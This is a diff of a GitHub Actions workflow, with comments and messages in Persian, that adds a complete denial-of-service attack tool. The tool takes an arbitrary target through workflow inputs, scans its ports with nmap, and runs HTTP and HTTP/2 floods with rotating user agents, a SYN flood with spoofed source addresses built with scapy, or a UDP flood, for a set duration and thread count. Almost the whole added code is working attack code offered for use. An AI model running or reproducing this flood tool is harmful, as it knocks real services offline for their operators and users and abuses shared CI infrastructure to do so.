@@ -14,7 +14,7 @@ on:
           - l7_http2_flood
           - l4_udp_flood
       target:
-        description: 'آدرس هدف (example.com یا یک IP)'
+        description: 'آدرس هدف (example.com یا IP)'
         required: true
       port:
         description: 'پورت هدف (auto = اسکن خودکار)'
@@ -48,38 +48,165 @@ jobs:
           THREADS: ${{ github.event.inputs.threads }}
         run: |
           python3 - << 'PYEOF'
-          import os, sys, time, socket, threading, random, nmap
-          # ... (تمامی توابع کمکی resolve_target, scan_open_ports و 
-          #      توابع حملات l7_http_flood, l4_syn_flood و غیره 
-          #      که در بخش‌های قبلی نوشتیم، در اینجا تعریف می‌شن.)
+          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp
+          from rich.console import Console
 
-          # --- بخش اصلی اجرای منطق ---
+          console = Console()
+
+          # ========== ۱. تبدیل دامنه به IP ==========
+          def resolve_target(target):
+              for prefix in ['https://', 'http://', 'ftp://']:
+                  if target.startswith(prefix):
+                      target = target[len(prefix):]
+              target = target.split('/')[0].split(':')[0]
+              try:
+                  return socket.gethostbyname(target)
+              except socket.gaierror:
+                  return None
+
+          # ========== ۲. اسکن پورت‌های باز با Nmap ==========
+          def scan_open_ports(ip, port_range='1-10000'):
+              console.print(f"🔍 شروع اسکن روی {ip}...")
+              nm = nmap.PortScanner()
+              nm.scan(hosts=ip, arguments=f'-sS -sV -p {port_range} --min-rate 1000')
+              open_ports = []
+              if ip in nm.all_hosts():
+                  for proto in nm[ip].all_protocols():
+                      for port in sorted(nm[ip][proto].keys()):
+                          if nm[ip][proto][port]['state'] == 'open':
+                              service = nm[ip][proto][port]['name']
+                              open_ports.append({'port': port, 'service': service})
+              return open_ports
+
+          # ========== ۳. توابع کمکی ==========
+          USER_AGENTS = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
+              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0",
+              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
+          ]
+
+          def get_random_ua():
+              return random.choice(USER_AGENTS)
+
+          def get_default_port_for_service(service):
+              if 'http' in service:
+                  return 443 if 'ssl' in service else 80
+              return None
+
+          # ========== ۴. موتورهای حمله ==========
+          async def http_worker(url):
+              headers = {"User-Agent": get_random_ua()}
+              async with aiohttp.ClientSession() as session:
+                  while True:
+                      try:
+                          async with session.get(url, headers=headers, timeout=5) as r:
+                              console.print(f"[dim]✓ {r.status}[/dim]", end="")
+                      except:
+                          console.print("[dim]✗[/dim]", end="")
+
+          def run_http_flood(url, workers):
+              loop = asyncio.new_event_loop()
+              asyncio.set_event_loop(loop)
+              tasks = [http_worker(url) for _ in range(workers)]
+              loop.run_until_complete(asyncio.gather(*tasks))
+
+          async def http2_worker(url):
+              import httpx
+              headers = {"User-Agent": get_random_ua()}
+              async with httpx.AsyncClient(http2=True) as client:
+                  while True:
+                      try:
+                          r = await client.get(url, headers=headers, timeout=5)
+                          console.print(f"[dim]✓ {r.status_code}[/dim]", end="")
+                      except:
+                          console.print("[dim]✗[/dim]", end="")
+
+          def run_http2_flood(url, workers):
+              loop = asyncio.new_event_loop()
+              asyncio.set_event_loop(loop)
+              tasks = [http2_worker(url) for _ in range(workers)]
+              loop.run_until_complete(asyncio.gather(*tasks))
+
+          def syn_worker(ip, port):
+              from scapy.all import IP, TCP, send
+              while True:
+                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+                  pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
+                  send(pkt, verbose=False)
+
+          def run_syn_flood(ip, port, workers):
+              for _ in range(workers):
+                  t = threading.Thread(target=syn_worker, args=(ip, port))
+                  t.daemon = True
+                  t.start()
+
+          def udp_worker(ip, port):
+              sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+              while True:
+                  sock.sendto(random._urandom(1024), (ip, port))
+
+          def run_udp_flood(ip, port, workers):
+              for _ in range(workers):
+                  t = threading.Thread(target=udp_worker, args=(ip, port))
+                  t.daemon = True
+                  t.start()
+
+          # ========== ۵. اجرای اصلی ==========
           TARGET = os.environ["TARGET_HOST"]
-          
-          # 1. پیدا کردن IP هدف
-          target_ip = resolve_target(TARGET)
-          if target_ip is None:
-              print("❌ نمی‌تونم IP هدف رو پیدا کنم.")
-              sys.exit(1)
-          print(f"🎯 هدف: {target_ip}")
+          ATTACK = os.environ["ATTACK_TYPE"]
+          DURATION = int(os.environ["DURATION"])
+          THREADS = int(os.environ["THREADS"])
+          PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
 
-          # 2. تصمیم‌گیری در مورد پورت
+          ip = resolve_target(TARGET)
+          if ip is None:
+              console.print("[red]❌ نمی‌تونم IP هدف رو پیدا کنم.[/red]")
+              sys.exit(1)
+          console.print(f"🎯 IP هدف: {ip}")
+
           target_ports = []
-          if os.environ["TARGET_PORT"].lower() == 'auto':
-              # اسکن خودکار پورت‌ها
-              open_ports = scan_open_ports(target_ip)
+          if PORT_ARG == 'auto':
+              open_ports = scan_open_ports(ip)
               if not open_ports:
-                  print("❌ هیچ پورت بازی پیدا نشد.")
+                  console.print("[red]❌ هیچ پورت بازی پیدا نشد.[/red]")
                   sys.exit(1)
-              target_ports = [p['port'] for p in open_ports]
-              print(f"🎯 پورت‌های هدف: {target_ports}")
+              for p in open_ports:
+                  console.print(f"  ✅ پورت {p['port']} ({p['service']})")
+              # انتخاب فقط پورت‌های HTTP/HTTPS برای حملات لایه ۷
+              if ATTACK in ('l7_http_flood', 'l7_http2_flood'):
+                  for p in open_ports:
+                      if 'http' in p['service'].lower():
+                          target_ports.append(p['port'])
+                  if not target_ports:
+                      console.print("[red]❌ هیچ سرویس HTTP/HTTPS برای حمله لایه ۷ پیدا نشد.[/red]")
+                      sys.exit(1)
+              else:
+                  target_ports = [p['port'] for p in open_ports]
           else:
               target_ports = [int(os.environ["TARGET_PORT"])]
 
-          # 3. اجرای حمله روی پورت(ها)
-          ATTACK_TYPE = os.environ["ATTACK_TYPE"]
-          for port in target_ports:
-              # اینجا تابع run_attack رو با IP، پورت و سایر پارامترها صدا بزن
-              pass
+          console.print(f"🎯 پورت‌های هدف: {target_ports}")
 
+          # اجرای حمله روی هر پورت
+          for port in target_ports:
+              console.print(f"🚀 شروع حمله {ATTACK} روی {ip}:{port}")
+              if ATTACK == 'l7_http_flood':
+                  scheme = "https" if port == 443 else "http"
+                  url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
+                  for _ in range(THREADS):
+                      t = threading.Thread(target=run_http_flood, args=(url, 5))
+                      t.daemon = True; t.start()
+              elif ATTACK == 'l7_http2_flood':
+                  scheme = "https" if port == 443 else "http"
+                  url = f"{scheme}://{TARGET}" if port in (80, 443) else f"{scheme}://{TARGET}:{port}"
+                  for _ in range(THREADS):
+                      t = threading.Thread(target=run_http2_flood, args=(url, 5))
+                      t.daemon = True; t.start()
+              elif ATTACK == 'l4_syn_flood':
+                  run_syn_flood(ip, port, THREADS)
+              elif ATTACK == 'l4_udp_flood':
+                  run_udp_flood(ip, port, THREADS)
+
+          time.sleep(DURATION)
+          console.print("[green]✅ عملیات پایان یافت.[/green]")
           PYEOF
